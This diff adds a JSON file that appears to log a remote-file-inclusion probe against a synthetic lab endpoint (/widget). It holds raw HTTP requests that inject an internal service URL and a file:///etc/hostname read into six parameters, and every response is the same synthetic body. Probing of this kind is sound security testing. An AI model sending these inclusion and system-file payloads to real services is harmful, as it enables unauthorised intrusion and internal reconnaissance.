@@ -1,0 +1,344 @@
+{
+ "meta": {
+  "intent": "INT-r27-0020",
+  "kind": "rfi-matrix",
+  "ts_literal": "2026-10-23T16:00:00Z"
+ },
+ "cases": [
+  {
+   "case": "baseline",
+   "param": null,
+   "payload": null,
+   "path": "/widget",
+   "raw_request": "GET /widget HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:35:54 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "55"
+   },
+   "resp_body_excerpt": "<html>GTRFI-01 synthetic remote include executed</html>",
+   "body_full_len": 55,
+   "elapsed_ms": 2
+  },
+  {
+   "case": "empty-param-baseline",
+   "param": "url",
+   "payload": null,
+   "path": "/widget?url=",
+   "raw_request": "GET /widget?url= HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:35:54 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "55"
+   },
+   "resp_body_excerpt": "<html>GTRFI-01 synthetic remote include executed</html>",
+   "body_full_len": 55,
+   "elapsed_ms": 2
+  },
+  {
+   "case": "empty-param-baseline",
+   "param": "uri",
+   "payload": null,
+   "path": "/widget?uri=",
+   "raw_request": "GET /widget?uri= HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:35:54 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "55"
+   },
+   "resp_body_excerpt": "<html>GTRFI-01 synthetic remote include executed</html>",
+   "body_full_len": 55,
+   "elapsed_ms": 3
+  },
+  {
+   "case": "empty-param-baseline",
+   "param": "src",
+   "payload": null,
+   "path": "/widget?src=",
+   "raw_request": "GET /widget?src= HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:35:55 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "55"
+   },
+   "resp_body_excerpt": "<html>GTRFI-01 synthetic remote include executed</html>",
+   "body_full_len": 55,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "empty-param-baseline",
+   "param": "include",
+   "payload": null,
+   "path": "/widget?include=",
+   "raw_request": "GET /widget?include= HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:35:55 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "55"
+   },
+   "resp_body_excerpt": "<html>GTRFI-01 synthetic remote include executed</html>",
+   "body_full_len": 55,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "empty-param-baseline",
+   "param": "file",
+   "payload": null,
+   "path": "/widget?file=",
+   "raw_request": "GET /widget?file= HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:35:55 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "55"
+   },
+   "resp_body_excerpt": "<html>GTRFI-01 synthetic remote include executed</html>",
+   "body_full_len": 55,
+   "elapsed_ms": 0
+  },
+  {
+   "case": "empty-param-baseline",
+   "param": "page",
+   "payload": null,
+   "path": "/widget?page=",
+   "raw_request": "GET /widget?page= HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:35:56 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "55"
+   },
+   "resp_body_excerpt": "<html>GTRFI-01 synthetic remote include executed</html>",
+   "body_full_len": 55,
+   "elapsed_ms": 2
+  },
+  {
+   "case": "payload",
+   "param": "url",
+   "payload": "http-svc-login",
+   "payload_raw": "http://svc-login:8004/",
+   "path": "/widget?url=http%3A%2F%2Fsvc-login%3A8004%2F",
+   "raw_request": "GET /widget?url=http%3A%2F%2Fsvc-login%3A8004%2F HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:35:56 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "55"
+   },
+   "resp_body_excerpt": "<html>GTRFI-01 synthetic remote include executed</html>",
+   "body_full_len": 55,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "param": "uri",
+   "payload": "http-svc-login",
+   "payload_raw": "http://svc-login:8004/",
+   "path": "/widget?uri=http%3A%2F%2Fsvc-login%3A8004%2F",
+   "raw_request": "GET /widget?uri=http%3A%2F%2Fsvc-login%3A8004%2F HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:35:56 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "55"
+   },
+   "resp_body_excerpt": "<html>GTRFI-01 synthetic remote include executed</html>",
+   "body_full_len": 55,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "param": "src",
+   "payload": "http-svc-login",
+   "payload_raw": "http://svc-login:8004/",
+   "path": "/widget?src=http%3A%2F%2Fsvc-login%3A8004%2F",
+   "raw_request": "GET /widget?src=http%3A%2F%2Fsvc-login%3A8004%2F HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:35:57 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "55"
+   },
+   "resp_body_excerpt": "<html>GTRFI-01 synthetic remote include executed</html>",
+   "body_full_len": 55,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "param": "include",
+   "payload": "http-svc-login",
+   "payload_raw": "http://svc-login:8004/",
+   "path": "/widget?include=http%3A%2F%2Fsvc-login%3A8004%2F",
+   "raw_request": "GET /widget?include=http%3A%2F%2Fsvc-login%3A8004%2F HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:35:57 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "55"
+   },
+   "resp_body_excerpt": "<html>GTRFI-01 synthetic remote include executed</html>",
+   "body_full_len": 55,
+   "elapsed_ms": 2
+  },
+  {
+   "case": "payload",
+   "param": "file",
+   "payload": "http-svc-login",
+   "payload_raw": "http://svc-login:8004/",
+   "path": "/widget?file=http%3A%2F%2Fsvc-login%3A8004%2F",
+   "raw_request": "GET /widget?file=http%3A%2F%2Fsvc-login%3A8004%2F HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:35:57 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "55"
+   },
+   "resp_body_excerpt": "<html>GTRFI-01 synthetic remote include executed</html>",
+   "body_full_len": 55,
+   "elapsed_ms": 0
+  },
+  {
+   "case": "payload",
+   "param": "page",
+   "payload": "http-svc-login",
+   "payload_raw": "http://svc-login:8004/",
+   "path": "/widget?page=http%3A%2F%2Fsvc-login%3A8004%2F",
+   "raw_request": "GET /widget?page=http%3A%2F%2Fsvc-login%3A8004%2F HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:35:57 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "55"
+   },
+   "resp_body_excerpt": "<html>GTRFI-01 synthetic remote include executed</html>",
+   "body_full_len": 55,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "param": "url",
+   "payload": "file-scheme",
+   "payload_raw": "file:///etc/hostname",
+   "path": "/widget?url=file%3A%2F%2F%2Fetc%2Fhostname",
+   "raw_request": "GET /widget?url=file%3A%2F%2F%2Fetc%2Fhostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:35:58 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "55"
+   },
+   "resp_body_excerpt": "<html>GTRFI-01 synthetic remote include executed</html>",
+   "body_full_len": 55,
+   "elapsed_ms": 2
+  },
+  {
+   "case": "payload",
+   "param": "uri",
+   "payload": "file-scheme",
+   "payload_raw": "file:///etc/hostname",
+   "path": "/widget?uri=file%3A%2F%2F%2Fetc%2Fhostname",
+   "raw_request": "GET /widget?uri=file%3A%2F%2F%2Fetc%2Fhostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:35:58 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "55"
+   },
+   "resp_body_excerpt": "<html>GTRFI-01 synthetic remote include executed</html>",
+   "body_full_len": 55,
+   "elapsed_ms": 2
+  },
+  {
+   "case": "payload",
+   "param": "src",
+   "payload": "file-scheme",
+   "payload_raw": "file:///etc/hostname",
+   "path": "/widget?src=file%3A%2F%2F%2Fetc%2Fhostname",
+   "raw_request": "GET /widget?src=file%3A%2F%2F%2Fetc%2Fhostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:35:58 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "55"
+   },
+   "resp_body_excerpt": "<html>GTRFI-01 synthetic remote include executed</html>",
+   "body_full_len": 55,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "param": "include",
+   "payload": "file-scheme",
+   "payload_raw": "file:///etc/hostname",
+   "path": "/widget?include=file%3A%2F%2F%2Fetc%2Fhostname",
+   "raw_request": "GET /widget?include=file%3A%2F%2F%2Fetc%2Fhostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:35:59 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "55"
+   },
+   "resp_body_excerpt": "<html>GTRFI-01 synthetic remote include executed</html>",
+   "body_full_len": 55,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "param": "file",
+   "payload": "file-scheme",
+   "payload_raw": "file:///etc/hostname",
+   "path": "/widget?file=file%3A%2F%2F%2Fetc%2Fhostname",
+   "raw_request": "GET /widget?file=file%3A%2F%2F%2Fetc%2Fhostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:35:59 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "55"
+   },
+   "resp_body_excerpt": "<html>GTRFI-01 synthetic remote include executed</html>",
+   "body_full_len": 55,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "param": "page",
+   "payload": "file-scheme",
+   "payload_raw": "file:///etc/hostname",
+   "path": "/widget?page=file%3A%2F%2F%2Fetc%2Fhostname",
+   "raw_request": "GET /widget?page=file%3A%2F%2F%2Fetc%2Fhostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:35:59 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "55"
+   },
+   "resp_body_excerpt": "<html>GTRFI-01 synthetic remote include executed</html>",
+   "body_full_len": 55,
+   "elapsed_ms": 0
+  }
+ ]
+}
